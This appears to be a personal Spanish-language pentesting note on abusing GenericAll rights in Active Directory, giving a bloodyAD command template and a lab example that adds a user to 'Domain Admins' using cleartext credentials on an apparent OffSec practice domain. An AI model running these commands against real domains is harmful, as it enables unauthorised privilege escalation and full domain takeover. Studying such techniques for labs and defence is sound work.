---
title: GenericAll sobre DC — BloodyAD
tags: [ad, genericall, bloodyad, privesc]
---

# GenericAll sobre DC

> [!important] Cuándo usarlo
> Si tienes **GenericAll** sobre el Domain Controller o un grupo privilegiado, puedes añadir usuarios a ese grupo directamente.

## Con BloodyAD

```bash
bloodyAD --host <IP_DC> -d <domain-name> -u 'usuario' -p 'password' add groupMember "PrivGroup" "myfakeuser"
```

## Ejemplo

```bash
bloodyAD --host 192.168.156.165 -d heist.offsec -u enox -p california add groupMember "Domain Admins" "enox"
```

## Ver también
- [[05-ad-attacks/discovery/default-domain-policy|Default Domain Policy]]
- [[05-ad-attacks/discovery/resourced-based-constrained-delegation|Resourced Based Constrained Delegation]]
